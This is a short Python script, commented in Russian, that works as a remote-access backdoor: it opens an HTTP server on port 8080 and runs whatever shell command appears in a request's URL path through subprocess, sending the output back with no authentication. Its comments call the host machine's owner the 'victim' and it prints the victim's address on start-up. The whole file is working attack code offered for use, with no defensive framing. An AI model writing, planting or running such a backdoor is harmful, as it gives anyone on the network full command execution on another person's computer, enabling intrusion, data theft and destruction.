import http.server
import socketserver
import subprocess
import os
import socket

PORT = 8080

# Получаем IP-адрес жертвы
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        command = self.path[1:]  # Получаем команду из URL
        if command:
            output = subprocess.getoutput(command)  # Выполняем команду
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(output.encode())  # Отправляем результат

print(f"Сервер запущен! Жертва в сети: http://{local_ip}:{PORT}")

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()